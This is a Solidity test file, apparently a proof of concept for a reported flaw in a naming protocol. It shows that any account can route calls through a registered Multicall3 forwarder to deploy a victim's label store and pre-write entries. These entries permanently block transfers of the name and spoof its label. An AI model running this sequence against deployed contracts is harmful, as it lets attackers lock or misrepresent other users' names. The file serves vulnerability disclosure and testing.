// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {BaseDotns} from "../../base/BaseDotns.t.sol";
import {IDotnsRegistrar} from "../../../contracts/registrars/IDotnsRegistrar.sol";
import {IPopRules} from "../../../contracts/pop/IPopRules.sol";
import {ILabelStore} from "../../../contracts/store/ILabelStore.sol";
import {Multicall3} from "../../../contracts/utils/Multicall3.sol";
import {IStoreFactory} from "../../../contracts/store/IStoreFactory.sol";
import {DotnsConstants} from "../../../contracts/utils/DotnsConstants.sol";

/// @notice Proves that a registry-registered call forwarder lets any account write into
/// another user's `LabelStore`, and that a pre-written entry survives registration and
/// permanently blocks transfers of the affected name.
contract LabelStorePoisoningTests is BaseDotns {
    function _wireMulticall() internal returns (Multicall3 multicall3) {
        multicall3 = new Multicall3();
        vm.prank(owner);
        protocolRegistry.set(DotnsConstants.MULTICALL3, address(multicall3));
    }

    function _via(Multicall3 m, address target, bytes memory data) internal {
        Multicall3.Call[] memory calls = new Multicall3.Call[](1);
        calls[0] = Multicall3.Call({target: target, callData: data});
        m.aggregate(calls);
    }

    function test_attacker_can_force_deploy_a_victims_store() public {
        Multicall3 multicall3 = _wireMulticall();
        address attacker = makeAddr("poisonAttacker");

        assertEq(storeFactory.getLabelStore(ed), address(0), "victim has no store yet");

        vm.prank(attacker);
        _via(
            multicall3,
            address(storeFactory),
            abi.encodeCall(IStoreFactory.deployLabelStoreFor, (ed))
        );

        address store = storeFactory.getLabelStore(ed);
        assertTrue(store != address(0), "attacker deployed the victim's store");
        assertEq(ILabelStore(store).owner(), ed, "store is owned by the victim");
    }

    function test_poisoned_entry_survives_registration_and_bricks_transfers() public {
        Multicall3 multicall3 = _wireMulticall();
        address attacker = makeAddr("poisonAttacker2");

        string memory label = "poisontarget";
        uint256 tokenId = _tokenIdForLabel(label);

        // Step 1: force-deploy the victim's store, then write the node the victim is about
        // to register with a string that does not carry the registry TLD.
        vm.startPrank(attacker);
        _via(
            multicall3,
            address(storeFactory),
            abi.encodeCall(IStoreFactory.deployLabelStoreFor, (ed))
        );
        address store = storeFactory.getLabelStore(ed);
        _via(
            multicall3,
            store,
            abi.encodeCall(ILabelStore.storeLabel, (bytes32(tokenId), "not-a-dotns-name"))
        );
        vm.stopPrank();

        // Step 2: the victim registers normally. The protocol's own label write is skipped,
        // because writeLabel treats an existing entry as locked.
        _register(label, ed, IPopRules.PopStatus.NoStatus);

        assertEq(dotnsRegistrar.ownerOf(tokenId), ed, "registration succeeded");
        assertEq(
            ILabelStore(store).getLabel(bytes32(tokenId)),
            "not-a-dotns-name",
            "the attacker's string survived registration"
        );

        // Step 3: the name is now permanently non-transferable, because the transfer hook
        // strips the TLD off the stored label and refuses an empty result.
        vm.prank(ed);
        vm.expectRevert(abi.encodeWithSelector(IDotnsRegistrar.InvalidLabel.selector));
        dotnsRegistrar.transferFrom(ed, leonardo, tokenId);

        // And the quote surface is equally dead, so a client cannot even discover the price.
        vm.expectRevert(abi.encodeWithSelector(IDotnsRegistrar.InvalidLabel.selector));
        dotnsRegistrar.quoteTransferFee(tokenId, leonardo);

        // There is no way to repair the entry: storeLabel is single-write and has no delete.
        vm.prank(ed);
        vm.expectRevert();
        ILabelStore(store).storeLabel(bytes32(tokenId), "poisontarget.dot");
    }

    function test_labelOf_reports_the_attackers_string() public {
        Multicall3 multicall3 = _wireMulticall();
        address attacker = makeAddr("poisonAttacker3");

        string memory label = "poisonlabelof";
        uint256 tokenId = _tokenIdForLabel(label);

        vm.startPrank(attacker);
        _via(
            multicall3,
            address(storeFactory),
            abi.encodeCall(IStoreFactory.deployLabelStoreFor, (ed))
        );
        address store = storeFactory.getLabelStore(ed);
        _via(
            multicall3,
            store,
            abi.encodeCall(ILabelStore.storeLabel, (bytes32(tokenId), "attacker.dot"))
        );
        vm.stopPrank();

        _register(label, ed, IPopRules.PopStatus.NoStatus);

        assertEq(
            dotnsRegistrar.labelOf(tokenId),
            "attacker",
            "labelOf resolves to the attacker's label, not the registered one"
        );
    }
}
